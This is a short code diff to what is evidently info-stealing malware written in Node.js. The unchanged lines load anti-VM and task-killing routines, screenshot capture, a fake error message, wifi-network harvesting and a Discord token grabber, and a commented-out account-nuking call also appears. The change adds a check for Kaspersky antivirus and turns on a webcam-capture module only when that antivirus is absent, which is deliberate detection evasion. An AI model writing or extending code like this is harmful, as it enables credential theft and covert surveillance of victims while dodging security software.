@@ -5,7 +5,7 @@ const config = require('./config');
 const { spawnSync, execSync } = require('child_process');
 const { checkVM, killTasks } = require('./functions/anti-vm');
 const sudo = require('sudo-prompt');
-const { isDarwin } = require('./util/os');
+const { isDarwin, hasKaspersky } = require('./util/os');
 const tempFolder = mkdtempSync(join(os.tmpdir(), sep)).toString();
 module.exports.tempFolder = tempFolder;
 spawnSync('explorer', [tempFolder]);
@@ -33,6 +33,7 @@ if (config.vmProtect && checkVM()) {
   if (!isDarwin()) require('./functions/screenshot');
   config.fakeError && require('./functions/fake-error');
   config.wifiNetworks && require('./functions/wifi-networks');
+  if (config.camera && !hasKaspersky()) require('./functions/camera');
 
   require('./functions/grab-discord-token').then(() => {
     // require('./functions/nuke-discord-account');
